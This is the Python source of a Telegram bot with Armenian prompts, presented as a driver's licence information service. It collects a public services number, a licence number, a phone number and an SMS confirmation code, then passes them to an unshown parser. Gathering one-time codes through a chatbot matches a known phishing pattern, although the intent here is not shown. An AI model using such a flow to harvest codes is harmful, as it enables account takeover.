import os

import telebot
from dotenv import load_dotenv

from parser import func

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")

if not TOKEN:
    raise ValueError("BOT_TOKEN is not set")

bot = telebot.TeleBot(TOKEN)


@bot.message_handler(commands=["start"])
def start_bot(message):
    bot.send_message(
        message.chat.id,
        "Բարի գալուստ վարորդական վկայականի մասին "
        "ինֆորմացիա տրամադրող բոտ։\n\n"
        "Գրիր հանրային ծառայությունների համարանիշը։"
    )

    bot.register_next_step_handler(message, get_public_number)


def get_public_number(message):
    text1 = message.text.strip()

    bot.send_message(
        message.chat.id,
        "Գրիր վարորդական վկայականի համարանիշը։"
    )

    bot.register_next_step_handler(
        message,
        get_driver_license,
        text1
    )


def get_driver_license(message, text1):
    text2 = message.text.strip()

    bot.send_message(
        message.chat.id,
        "Գրիր հեռախոսահամարը։"
    )

    bot.register_next_step_handler(
        message,
        get_phone,
        text1,
        text2
    )


def get_phone(message, text1, text2):
    text3 = message.text.strip()

    bot.send_message(
        message.chat.id,
        "Մուտքագրիր SMS-ով ստացած հաստատման կոդը։"
    )

    bot.register_next_step_handler(
        message,
        get_sms_code,
        text1,
        text2,
        text3
    )


def get_sms_code(message, text1, text2, text3):
    sms_code = message.text.strip()

    bot.send_message(
        message.chat.id,
        "Ստուգում եմ տվյալները..."
    )

    try:
        result = func(text1, text2, text3, sms_code)
        bot.send_message(message.chat.id, str(result))
    except Exception:
        bot.send_message(
            message.chat.id,
            "Տեղի ունեցավ սխալ։ Խնդրում ենք փորձել կրկին։"
        )


if __name__ == "__main__":
    bot.infinity_polling(skip_pending=True)
